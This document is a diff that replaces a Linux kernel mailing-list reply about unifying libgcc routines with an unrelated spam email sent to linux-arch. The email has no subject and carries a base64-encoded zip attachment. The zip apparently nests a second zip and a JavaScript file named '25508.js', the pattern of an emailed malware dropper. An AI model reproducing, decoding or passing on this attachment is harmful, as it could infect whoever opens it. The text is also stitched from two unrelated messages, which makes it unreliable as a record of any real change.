@@ -1,63 +1,74 @@
-From: Palmer Dabbelt <palmer@dabbelt.com>
-Subject: Re: Unify the various copies of libgcc into lib
-Date: Fri, 02 Jun 2017 19:59:15 -0700 (PDT)
-Message-ID: <mhng-d2e4c1c0-792e-4de2-ae3f-7cceb4c7508a@palmer-si-x1c4>
-References: <CAMuHMdUP2RbjV+09UGkzjJcRrsoyy9F6XT8fbCPEd0mQCDFvFw@mail.gmail.com>
-Mime-Version: 1.0 (MHng)
-Return-path: <linux-mips-bounce@linux-mips.org>
-In-Reply-To: <CAMuHMdUP2RbjV+09UGkzjJcRrsoyy9F6XT8fbCPEd0mQCDFvFw@mail.gmail.com>
-Sender: linux-mips-bounce@linux-mips.org
-Errors-to: linux-mips-bounce@linux-mips.org
-List-help: <mailto:ecartis@linux-mips.org?Subject=help>
-List-unsubscribe: <mailto:ecartis@linux-mips.org?subject=unsubscribe%20linux-mips>
-List-software: Ecartis version 1.0.0
-List-subscribe: <mailto:ecartis@linux-mips.org?subject=subscribe%20linux-mips>
-List-owner: <mailto:ralf@linux-mips.org>
-List-post: <mailto:linux-mips@linux-mips.org>
-List-archive: <http://www.linux-mips.org/archives/linux-mips/>
-To: geert@linux-m68k.org
-Cc: monstr@monstr.eu, ralf@linux-mips.org, liqin.linux@gmail.com, lennox.wu@gmail.com, ysato@users.sourceforge.jp, dalias@libc.org, davem@davemloft.net, linux-mips@linux-mips.org, linux-sh@vger.kernel.org, sparclinux@vger.kernel.org, linux-kernel@vger.kernel.org, linux-arch@vger.kernel.org
-List-Id: linux-arch.vger.kernel.org
+From: <nfrankiyamu@centrum.cz>
+Subject: (unknown)
+Date: Sat, 03 Jun 2017 05:45:49 -0000
+Message-ID: <149646874975.8929.4193992470744325319@surnet.ru>
+Mime-Version: 1.0
+Content-Type: application/zip; name="34618930.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-arch-owner@vger.kernel.org>
+Received: from ip-178-46-164-68.dsl.surnet.ru ([178.46.164.68]:56483 "HELO
+        surnet.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1750765AbdFCFpy (ORCPT <rfc822;linux-arch@vger.kernel.org>);
+        Sat, 3 Jun 2017 01:45:54 -0400
+Content-Disposition: attachment
+Subject: 
+Sender: linux-arch-owner@vger.kernel.org
+List-ID: <linux-arch.vger.kernel.org>
+To: linux-arch@vger.kernel.org
 
-On Wed, 24 May 2017 02:21:22 PDT (-0700), geert@linux-m68k.org wrote:
-> Hi Palmer,
->
-> On Wed, May 24, 2017 at 12:05 AM, Palmer Dabbelt <palmer@dabbelt.com> wrote:
->> I'm in the process of submitting the RISC-V Linux port, and someone noticed
->> that we were adding copies of some libgcc emulation routines that were the same
->> as some of the other ports.  This prompted me to go through and check all the
->> ports for libgcc.h and to merge the versions that were functionally identical.
->>
->> The only difference in libgcc.h was that there was a #define for little vs big
->> endian.  The differences in the emulation routines were all just whitespace.
->>
->> This patch set comes in two parts:
->>
->>  * Patch 1 adds new copies of all the C files copied from libgcc, as well as
->>    moving libgcc.h to include/lib (that's a new folder, which probably means
->>    it's the wrong place to put it, but I couldn't find anything better).  There
->>    are Kconfig entries for each of these library functions so architectures can
->>    select them one at a time.
->
-> I would call the Kconfig symbols GENERIC_* instead of LIB_*, for consistency
-> with other generic implementations.
-
-OK.  I'll include that in my v2 patch set.
-
->>  * The rest of the patches convert each architecture over to the new system.
->
-> Thanks! For all but "[PATCH 4/7] mips: ...":
->
-> Reviewed-by: Geert Uytterhoeven <geert@linux-m68k.org>
-
-Thanks!
-
->> Unless I screwed something up, this patch set shouldn't actually change any
->> functionality.  Unfortunately I don't actually have all these cross compilers
->> setup so I can't actually test any of this, but I did convert the RISC-V port
->> over to using this system and it appears to be OK there so at least this isn't
->> completely broken.
->
-> https://www.kernel.org/pub/tools/crosstool/
-
-Cool.  I'll build everything before I submit a v2.
+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
+BAAAAABQSwUGAAAAAAEAAQBPAAAA9QsAAAAA
